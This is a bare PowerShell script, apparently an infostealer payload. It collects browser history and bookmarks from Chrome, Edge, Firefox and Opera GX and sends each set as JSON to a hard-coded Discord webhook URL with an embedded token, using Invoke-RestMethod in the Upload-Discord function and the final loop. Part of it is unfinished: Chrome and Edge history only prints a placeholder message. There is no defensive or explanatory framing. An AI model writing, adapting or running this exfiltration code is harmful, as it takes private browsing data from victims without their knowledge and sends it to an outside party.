# Function to get browser data
function Get-BrowserData {
    [CmdletBinding()]
    param (
        [Parameter(Position = 1, Mandatory = $True)]
        [string]$Browser,
        [Parameter(Position = 2, Mandatory = $True)]
        [string]$DataType
    )

    # Define paths based on the browser and data type
    switch ($Browser) {
        'chrome' {
            if ($DataType -eq 'history') {
                $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
            } elseif ($DataType -eq 'bookmarks') {
                $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
            }
        }
        'edge' {
            if ($DataType -eq 'history') {
                $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
            } elseif ($DataType -eq 'bookmarks') {
                $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
            }
        }
        'firefox' {
            if ($DataType -eq 'history') {
                $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
            }
        }
        'opera' {
            if ($DataType -eq 'history') {
                $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
            } elseif ($DataType -eq 'bookmarks') {
                $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
            }
        }
    }

    # Validate the path exists
    if (-Not (Test-Path $Path)) {
        Write-Error "File not found: $Path"
        return
    }

    # Process history or bookmarks
    if ($DataType -eq 'history') {
        if ($Browser -eq 'firefox') {
            $Query = "SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 10;"
            $Connection = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$Path;Version=3;")
            $Command = New-Object System.Data.SQLite.SQLiteCommand($Query, $Connection)
            $Connection.Open()
            $Reader = $Command.ExecuteReader()
            $Results = @()
            while ($Reader.Read()) {
                $Results += [PSCustomObject]@{
                    URL   = $Reader['url']
                    Title = $Reader['title']
                }
            }
            $Connection.Close()
            return $Results
        } else {
            Write-Output "SQLite query needed for Chrome/Edge history."
        }
    } elseif ($DataType -eq 'bookmarks') {
        $Bookmarks = Get-Content -Path $Path | ConvertFrom-Json
        return $Bookmarks
    }
}

# Function to upload data to Discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position = 0, Mandatory = $True)]
        [string]$Content
    )

    $WebhookURL = "https://discord.com/api/webhooks/1308657646064111617/0jk_WQbEbcvjfOdJgz71sHQT1FYkrVaijOysKMkove-YoA0JwomMJH0fgSAbNej5J5CL"

    # Prepare data
    $Body = @{
        username = "BrowserDataBot"
        content  = $Content
    }

    # Send the data
    try {
        Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType 'application/json' -Body ($Body | ConvertTo-Json -Depth 10)
    } catch {
        Write-Error "Failed to upload to Discord: $_"
    }
}

# Gather and send data
$BrowserList = @("chrome", "edge", "firefox", "opera")
$DataTypes = @("history", "bookmarks")

foreach ($Browser in $BrowserList) {
    foreach ($DataType in $DataTypes) {
        $Data = Get-BrowserData -Browser $Browser -DataType $DataType
        if ($Data) {
            $Content = ($Data | ConvertTo-Json -Depth 10)
            Upload-Discord -Content $Content
        }
    }
}
